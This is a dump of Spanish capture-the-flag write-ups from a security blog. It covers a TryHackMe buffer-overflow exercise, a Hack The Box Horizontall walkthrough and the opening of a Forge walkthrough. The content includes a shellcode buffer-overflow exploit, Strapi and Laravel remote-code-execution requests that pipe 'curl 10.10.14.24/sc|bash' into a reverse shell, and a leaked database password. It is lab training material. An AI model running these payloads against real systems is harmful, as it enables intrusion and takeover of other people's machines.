\u0026#34;\\x56\\xa4\\xd8\\xce\\x01\\x66\\xcb\\xa7\\xa9\\xcc\\xdd\\xa3\\xfb\\x47\\x3b\u0026#34; \u0026#34;\\xcc\\xd1\\x98\\x8a\\xce\\x58\\x6b\\xa9\\xc7\\x3e\\x1b\\x58\\x66\\xb5\\xc2\u0026#34; \u0026#34;\\x22\\xe8\\xc9\\xbb\\x31\\xce\\x31\\x7b\\x7f\\xf0\\x3e\\x1b\\xb5\\xc5\\xac\u0026#34; \u0026#34;\\xaa\\xdd\\x2f\\x22\\x99\\x8a\\xf1\\xf0\\x38\\xb7\\xb4\\x98\\x98\\x3f\\x5b\u0026#34; \u0026#34;\\xa7\\x09\\x99\\x82\\xfd\\xcf\\xdc\\x2b\\x85\\xea\\xcd\\x60\\xc1\\x8a\\x89\u0026#34; \u0026#34;\\xf6\\x97\\x98\\x8b\\xe0\\x97\\x80\\x8b\\xf0\\x92\\x98\\xb5\\xdf\\x0d\\xf1\u0026#34; \u0026#34;\\x5b\\x59\\x14\\x47\\x3d\\xe8\\x97\\x88\\x22\\x96\\xa9\\xc6\\x5a\\xbb\\xa1\u0026#34; \u0026#34;\\x31\\x08\\x1d\\x21\\xd3\\xf7\\xac\\xa9\\x68\\x48\\x1b\\x5c\\x31\\x08\\x9a\u0026#34; \u0026#34;\\xc7\\xb2\\xd7\\x26\\x3a\\x2e\\xa8\\xa3\\x7a\\x89\\xce\\xd4\\xae\\xa4\\xdd\u0026#34; \u0026#34;\\xf5\\x3e\\x1b\u0026#34;) eip_ret = pack(\u0026#34;\u0026lt;L\u0026#34;,0x62501205) nops = \u0026#34;\\x90\u0026#34; * 16 padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 537 + eip_ret + nops + shellcode + padding * (1050 - 537 - 4 - 16 - 348) try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW10 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) Tras ejecutar el script logramos obtener una shell.\n1 2 3 4 5 6 7 8 9 10 11 ➜ OVERFLOW_10 nc -lnvp 1338 Listening on 0.0.0.0 1338 Connection received on 192.168.22.128 49189 Microsoft Windows [Versin 6.1.7601] Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos. C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\u0026gt;echo %username% echo %username% sckull C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\u0026gt; ","description":"Buffer Overflow Prep es una room enfocada a la practica de explotación para el OSCP. Se muestran los 'pasos', comandos y herramientas para llegar a la solución de cada uno de los retos.","id":36,"section":"posts","tags":["buffer-overflow","immunity-debbuger","mona","python"],"title":"TryHackMe - Buffer Overflow Prep","uri":"https://sckull.github.io/posts/bufferoverflow/"},{"content":"\rEn Horizontall descubrimos Strapi, explotamos multiples vulnerabilidades lo que nos permitió el acceso a la máquina. Escalamos privilegios explotando una vulnerabilidad en Laravel.\nNombre Horizontall OS Linux Puntos 20 Dificultad Facil IP 10.10.11.105 Maker wail99\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[5.8, 5.3, 6.1, 3.9, 4.7],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[6, 9, 10, 0, 1],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap Escaneo de puertos con nmap nos muestra multiples puertos abiertos: http (80), ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Nmap scan report for horizontall.htb (10.10.11.105) Host is up (0.39s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA) | 256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA) |_ 256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: horizontall Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Web Site Encontramos lo que parece ser una pagina estática, tras verificar el codigo fuente vemos que existe codigo Javascript y que se podria tratar de una app escrita en este lenguaje o algun Framework derivado.\nEl archivo app.c68eb462.js contiene codigo Javascript, vemos dentro del codigo una variable que contiene un metodo que obtiene opiniones desde una \u0026ldquo;API\u0026rdquo; que se encuentra en un subdominio. Además al final, vemos un comentario con un nombre de un archivo que pertenece al Mapa Fuente.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 // [ ... REDACTED ...] y = { name: \u0026#34;App\u0026#34;, components: { Navbar: v, Home: w }, data: function() { return { reviews: [] } }, methods: { getReviews: function() { var t = this; r.a.get(\u0026#34;http://api-prod.horizontall.htb/reviews\u0026#34;).then((function(s) { return t.reviews = s.data })) } } } //[ ... REDACTED ...] //# sourceMappingURL=app.c68eb462.js.map Tras obtener el archivo (app.c68eb462.js.map) vemos los diferentes componentes de la app, está utilizando VueJS. Observamos tambien una solicitud hecha con axios para mostrar información de los \u0026ldquo;reviews\u0026rdquo; misma que se presentó anteriormente, lo que indica que podria ser el codigo fuente de la app del dominio principal.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import axios from \u0026#39;axios\u0026#39; import Navbar from \u0026#39;./components/Navbar.vue\u0026#39; import Home from \u0026#39;./components/Home.vue\u0026#39; export default { name: \u0026#39;App\u0026#39;, components: { Navbar, Home }, data(){ return { reviews:[], } }, methods:{ getReviews(){ axios.get(\u0026#39;http://api-prod.horizontall.htb/reviews\u0026#39;) .then(response =\u0026gt; this.reviews = response.data) } } } Tras visitar el subdmonio vemos solo un mensaje: \u0026ldquo;Welcome\u0026rdquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 π ~/htb/horizontall ❯ curl -s http://api-prod.horizontall.htb \u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34; /\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;IE=edge,chrome=1\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;Welcome to your API\u0026lt;/title\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34; /\u0026gt; \u0026lt;style\u0026gt; \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;section\u0026gt; \u0026lt;div class=\u0026#34;wrapper\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Welcome.\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; π ~/htb/horizontall ❯ Directory Brute Forcing feroxbuster muestra las direcciones de recursos de la pagina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 π ~/htb/horizontall ❯ feroxbuster -u http://horizontall.htb/ -w $MD -x js,txt,xml ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.3.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://horizontall.htb/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 💲 Extensions │ [js, txt, xml] 🔃 Recursion Depth │ 4 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 301 7l 13w 194c http://horizontall.htb/img 301 7l 13w 194c http://horizontall.htb/css 301 7l 13w 194c http://horizontall.htb/js Tambien ejecutamos feroxbuster en el subdominio, vemos dos nuevas rutas: users, admin.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 π ~/htb/horizontall ❯ feroxbuster -u http://api-prod.horizontall.htb/ -w $MD ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.3.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://api-prod.horizontall.htb/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔃 Recursion Depth │ 4 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 200 1l 21w 507c http://api-prod.horizontall.htb/reviews 403 1l 1w 60c http://api-prod.horizontall.htb/users 200 16l 101w 854c http://api-prod.horizontall.htb/admin 200 1l 21w 507c http://api-prod.horizontall.htb/Reviews 403 1l 1w 60c http://api-prod.horizontall.htb/Users 200 16l 101w 854c http://api-prod.horizontall.htb/Admin 200 1l 21w 507c http://api-prod.horizontall.htb/REVIEWS [####################] - 11m 220545/220545 0s found:7 errors:5 [####################] - 11m 220545/220545 324/s http://api-prod.horizontall.htb/ π ~/htb/horizontall ❯ En /users solo retorna un mensaje de error.\n1 {\u0026#34;statusCode\u0026#34;:403,\u0026#34;error\u0026#34;:\u0026#34;Forbidden\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Forbidden\u0026#34;} Strapi En /admin vemos un login donde se muestra strapi, este es un sistema gestor de contenidos (CMS).\nUtilizamos Burpsuite para capturar las solicitudes, entre ellas encontramos información, el entorno: en Desarrollo, y la version de strapi: 3.0.0-beta.17.4.\nMediante la documentacion intentamos registrar un usuario con curl pero parece no estar disponible dicha ruta.\n1 2 3 π ~/htb/horizontall ❯ curl -sX POST http://api-prod.horizontall.htb/admin/local/register -H \u0026#39;Content-Type: application/json\u0026#39; -d \u0026#39;{\u0026#34;username\u0026#34;:\u0026#34;sckull\u0026#34;,\u0026#34;email\u0026#34;:\u0026#34;sckull@strapi.io\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;123@Abc\u0026#34;}\u0026#39; {\u0026#34;statusCode\u0026#34;:404,\u0026#34;error\u0026#34;:\u0026#34;Not Found\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Not Found\u0026#34;} π ~/htb/horizontall ❯ Admin Con la opción Olvidaste tu contraseña? realizamos una \u0026ldquo;enumeracion\u0026rdquo; de posibles correos (nombres de usuario comunes) tomando como dominio horizontall.htb, el usuario admin es el unico que no mostró el error: \u0026lsquo;This email does not exit\u0026rsquo;, y consideramos este como existente y válido.\nVulnerabilidades Vemos en snyk.io multiples vulnerabilidades para la version que encontramos. Improper Access Control, este no maneja de manera \u0026ldquo;correcta\u0026rdquo; al restablecer contraseñas, además cuenta con un CVE: CVE-2019-18818. Tambien encontramos Arbitrary Code Injection, este permite ejecutar comandos en la instalacion de un plugin, intentamos replicar esta vulnerabilidad pero es necesario un token.\nUser - Strapi Improper Access Control Encontramos información sobre el CVE-2019-18818 donde muestra que al enviar una solicitud para restablecer una contraseña el servidor responde con información del primer usuario en la base de datos, tambien encontramos un post que presenta un pequeño exploit. Tras replicar esto en una solicitud en Burpsuite vemos el token y usuario.\nCode Injection Con el token que tenemos podemos replicar la explotación (CVE-2019-19609). Creamos primero un pequeño servidor en python y un archivo con shell inversa.\n1 2 python3 -m http.server 80 wget -q https://shell.infosecjack.me/10.10.20.21:1337 -O sc Creamos nuestra solicitud, cambiando el comando para ejecutar nuestra propia shell.\n1 2 3 4 5 6 curl -i -sX POST -H \u0026#39;Host: api-prod.horizontall.htb\u0026#39; \\ -H \u0026#39;Authorization: Bearer eyJhbGciOiJIUzI1N[.. snip ..]l9pTlqYM\u0026#39;\\ -H \u0026#39;Content-Type: application/json\u0026#39;\\ -H \u0026#39;Origin: http://api-prod.horizontall.htb\u0026#39; \\ --data \u0026#39;{\u0026#34;plugin\u0026#34;:\u0026#34;documentation \u0026amp;\u0026amp; $(curl 10.10.14.24/sc|bash)\u0026#34;,\u0026#34;port\u0026#34;:\u0026#34;80\u0026#34;}\u0026#39;\\ http://api-prod.horizontall.htb/admin/plugins/install Shell Tras enviar la solicitud logramos obtener una shell como strapi y realizar la lectura de user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 π ~/htb/horizontall ❯ bash -c \u0026#39;rlwrap nc -lvp 1338\u0026#39; listening on [any] 1338 ... connect to [10.10.14.24] from horizontall.htb [10.10.11.105] 39238 can\u0026#39;t access tty; job control turned off which python /usr/bin/python python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; strapi@horizontall:~/myapi$ whoami; id; pwd strapi uid=1001(strapi) gid=1001(strapi) groups=1001(strapi) /opt/strapi/myapi strapi@horizontall:~/myapi$ cd /home strapi@horizontall:/home$ ls developer strapi@horizontall:/home$ cd developer strapi@horizontall:/home/developer$ ls composer-setup.php myproject user.txt strapi@horizontall:/home/developer$ cat user.txt 8d625405c35dbaef6e6a480d88213e6a strapi@horizontall:/home/developer$ Vemos las credenciales dentro de los archivos de configuración de strapi, pero no se muestran credenciales dentro de la base de datos para cambiar a otro usuario.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 strapi@horizontall:~/myapi/config/environments/development$ ls -lah total 32K drwxr-xr-x 2 strapi strapi 4.0K Jul 29 04:38 . drwxr-xr-x 5 strapi strapi 4.0K May 26 14:31 .. -rw-r--r-- 1 strapi strapi 135 May 26 14:31 custom.json -rw-rw-r-- 1 strapi strapi 351 May 26 14:31 database.json -rw-r--r-- 1 strapi strapi 439 May 26 14:31 request.json -rw-r--r-- 1 strapi strapi 164 May 26 14:31 response.json -rw-r--r-- 1 strapi strapi 529 May 26 14:31 security.json -rw-r--r-- 1 strapi strapi 159 May 26 14:31 server.json strapi@horizontall:~/myapi/config/environments/development$ cat database.json { \u0026#34;defaultConnection\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;connections\u0026#34;: { \u0026#34;default\u0026#34;: { \u0026#34;connector\u0026#34;: \u0026#34;strapi-hook-bookshelf\u0026#34;, \u0026#34;settings\u0026#34;: { \u0026#34;client\u0026#34;: \u0026#34;mysql\u0026#34;, \u0026#34;database\u0026#34;: \u0026#34;strapi\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;127.0.0.1\u0026#34;, \u0026#34;port\u0026#34;: 3306, \u0026#34;username\u0026#34;: \u0026#34;developer\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;#J!:F9Zt2u\u0026#34; }, \u0026#34;options\u0026#34;: {} } } } strapi@horizontall:~/myapi/config/environments/development$ Privesc Enumeramos los puertos abiertos y vemos tres puertos, el puerto 3306 pertenece al puerto de MySQL, el 1337 a istrapi y finalmente, 8000 el cual no vemos algun proceso.\n1 2 3 4 5 6 7 8 9 10 11 strapi@horizontall:~$ netstat -ntpl Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:1337 0.0.0.0:* LISTEN 1760/node /usr/bin/ tcp 0 0 127.0.0.1:8000 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - strapi@horizontall:~$ Vemos strapi en la configuracion de nginx.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 strapi@horizontall:/etc/nginx/sites-available$ cat * | grep -v \u0026#34;#\u0026#34; server { listen 80; listen [::]:80; server_name horizontall.htb www.horizontall.htb; root /var/www/html/horizontall; index index.html index.htm; location / { try_files $uri $uri/ =404; } } server { listen [::]:80; listen 80; server_name api-prod.horizontall.htb; location / { proxy_pass http://localhost:1337; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026#39;upgrade\u0026#39;; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; } } server { listen 80 default_server; listen [::]:80 default_server; return 301 http://horizontall.htb; } strapi@horizontall:/etc/nginx/sites-available$ Laravel - CVE-2021-3129 Aunque al realizar una solicitud vemos la version de laravel: 7.4.18. Verificamos si la version tiene alguna vulnerabilidad aunque no encontramos ninguna relacionada a esta version, encontramos una más reciente: CVE-2021-3129.\n1 2 3 4 5 6 7 8 9 10 11 12 strapi@horizontall:~$ curl -s http://127.0.0.1:8000|tail \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;ml-4 text-center text-sm text-gray-500 sm:text-right sm:ml-0\u0026#34;\u0026gt; Laravel v8 (PHP v7.4.18) \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; strapi@horizontall:~$ Exploit Descubrimos un repositorio donde vemos un exploit que, utilizamos para explotar la vulnerabilidad de RCE de Laravel, descargando el repositorio ZIP en la maquina, tras ejecutar el exploit vemos que la mayoria de las \u0026ldquo;versiones\u0026rdquo; funcionan.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 strapi@horizontall:~/CVE-2021-3129-main$ python3 exp.py http://127.0.0.1:8000 [*] Try to use Laravel/RCE1 for exploitation. [+]exploit: [*] Laravel/RCE1 Result: [*] Try to use Laravel/RCE2 for exploitation. [+]exploit: [*] Laravel/RCE2 Result: uid=0(root) gid=0(root) groups=0(root) [*] Try to use Laravel/RCE3 for exploitation. [+]exploit: [*] Laravel/RCE3 Result: [*] Try to use Laravel/RCE4 for exploitation. [+]exploit: [*] Laravel/RCE4 Result: uid=0(root) gid=0(root) groups=0(root) [*] Try to use Laravel/RCE5 for exploitation. [+]exploit: [*] Laravel/RCE5 Result: uid=0(root) gid=0(root) groups=0(root) [*] Try to use Laravel/RCE6 for exploitation. [+]exploit: [*] Laravel/RCE6 Result: uid=0(root) gid=0(root) groups=0(root) [*] Try to use Laravel/RCE7 for exploitation. [+]exploit: [*] Laravel/RCE7 Result: [*] Try to use Monolog/RCE1 for exploitation. [+]exploit: [*] Monolog/RCE1 Result: uid=0(root) gid=0(root) groups=0(root) [*] Try to use Monolog/RCE2 for exploitation. [+]exploit: [*] Monolog/RCE2 Result: uid=0(root) gid=0(root) groups=0(root) [*] Try to use Monolog/RCE3 for exploitation. [+]exploit: [*] Monolog/RCE3 Result: [*] Try to use Monolog/RCE4 for exploitation. [+]exploit: [*] Monolog/RCE4 Result: strapi@horizontall:~/CVE-2021-3129-main$ Shell Modificamos el exploit para ejecutar una shell inversa como en User - Strapi.\n1 2 3 4 5 6 7 class EXP: #这里还可以增加phpggc的使用链，经过测试发现RCE5可以使用 __gadget_chains = { [.. snip ..] \u0026#34;Laravel/RCE6\u0026#34;:r\u0026#34;\u0026#34;\u0026#34; php -d \u0026#34;phar.readonly=0\u0026#34; ./phpggc Laravel/RCE6 \u0026#34;system(\u0026#39; curl 10.10.14.24/sc|bash \u0026#39;);\u0026#34; --phar phar -o php://output | base64 -w 0 | python -c \u0026#34;import sys;print(\u0026#39;\u0026#39;.join([\u0026#39;=\u0026#39; + hex (ord(i))[2:] + \u0026#39;=00\u0026#39; for i in sys.stdin.read()]).upper())\u0026#34; \u0026#34;\u0026#34;\u0026#34;, Logramos obtener acceso root y la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 π ~/htb/horizontall ❯ bash -c \u0026#39;rlwrap nc -lvp 1338\u0026#39; listening on [any] 1338 ... connect to [10.10.14.24] from horizontall.htb [10.10.11.105] 40020 /bin/sh: 0: can\u0026#39;t access tty; job control turned off python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; whoami; id; pwd whoami; id; pwd root uid=0(root) gid=0(root) groups=0(root) /home/developer/myproject/public cd cd ls ls boot.sh pid restart.sh root.txt cat root.txt cat root.txt 9a48fa6338ba86de7204da0255c9c8bc root@horizontall:~# ","description":"En Horizontall descubrimos Strapi, explotamos multiples vulnerabilidades lo que nos permitió el acceso a la máquina. Escalamos privilegios explotando una vulnerabilidad en Laravel.","id":37,"section":"posts","tags":["strapi","vuejs","code-injection","improper-acces-control","laravel"],"title":"Hack The Box - Horizontall","uri":"https://sckull.github.io/posts/horizontall/"},{"content":"\rEn Forge encontramos una vulnerabilidad SSRF que nos permitió acceder por el servicio FTP donde encontramos una clave privada que nos dio acceso por SSH. Finalmente escalamos privilegios tras la ejecución de un script de python que utiliza PDB, haciendo que este genére un error para obtener una shell como root.\nNombre Forge OS Linux Puntos 30 Dificultad Media IP 10.10.11.111 Maker NoobHacker9999\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[5.7, 4.8, 4.5, 5.5, 5.2],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[4, 3, 3, 7, 7],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon Nmap Escaneo de puertos con nmap nos muestra el puerto http (80) y ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Nmap 7.91 scan initiated Sat Sep 11 20:26:28 2021 as: nmap -p22,80 -sC -sV -o nmap_scan 10.10.11.111 Nmap scan report for forge.htb (10.10.11.111) Host is up (0.15s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA) | 256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA) |_ 256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Gallery Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Sep 11 20:26:40 2021 -- 1 IP address (1 host up) scanned in 11.53 seconds Web Site Vemos con curl que las solicitudes directas a la direccion IP redirigen hacia el dominio forge.htb, por ello agregamos este ultimo al archivo /etc/hosts.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ➜ forge curl -s 10.10.11.111 \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;302 Found\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Found\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;The document has moved \u0026lt;a href=\u0026#34;http://forge.htb\u0026#34;\u0026gt;here\u0026lt;/a\u0026gt;.\u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;address\u0026gt;Apache/2.4.41 (Ubuntu) Server at 10.10.11.111 Port 80\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; ➜ forge curl -sI 10.10.11.111 HTTP/1.1 302 Found Date: Sat, 11 Sep 2021 22:02:13 GMT Server: Apache/2.4.41 (Ubuntu) Location: http://forge.htb Content-Type: text/html; charset=iso-8859-1 ➜ forge En el dominio se muestra unicamente una galeria de imagenes en la pagina de inicio.\nVemos un formulario para subir imagenes en Upload an image, donde se muestran dos opciones, subir archivos locales o subir archivos desde una url.\nEl codigo fuente de main.js muestra los formularios para ambas opciones.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 function show_upload_local_file(argument) { var form_div = document.getElementById(\u0026#39;form-div\u0026#39;); form_div.innerHTML = ` \u0026lt;form action=\u0026#34;/upload\u0026#34; method=\u0026#34;POST\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; class=\u0026#34;file\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;local\u0026#34; type=\u0026#34;hidden\u0026#34; value=\u0026#39;1\u0026#39;\u0026gt; \u0026lt;br\u0026gt; \u0026lt;br\u0026gt; \u0026lt;button id=\u0026#34;submit-local\u0026#34; type=\u0026#34;submit\u0026#34; class=\u0026#34;submit\u0026#34;\u0026gt;Submit\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; `; } function show_upload_remote_file(argument) { var form_div = document.getElementById(\u0026#39;form-div\u0026#39;); form_div.innerHTML = ` \u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;form action=\u0026#34;/upload\u0026#34; method=\u0026#34;POST\u0026#34; enctype=\u0026#34;application/x-www-form-urlencoded\u0026#34; \u0026gt; \u0026lt;input type=\u0026#34;textbox\u0026#34; name=\u0026#34;url\u0026#34; class=\u0026#34;textbox\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;remote\u0026#34; type=\u0026#34;hidden\u0026#34; value=\u0026#39;1\u0026#39;\u0026gt; \u0026lt;br\u0026gt; \u0026lt;br\u0026gt; \u0026lt;button id=\u0026#34;submit-remote\u0026#34; type=\u0026#34;submit\u0026#34; class=\u0026#34;submit\u0026#34;\u0026gt;Submit\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; `; } Directory Brute Forcing 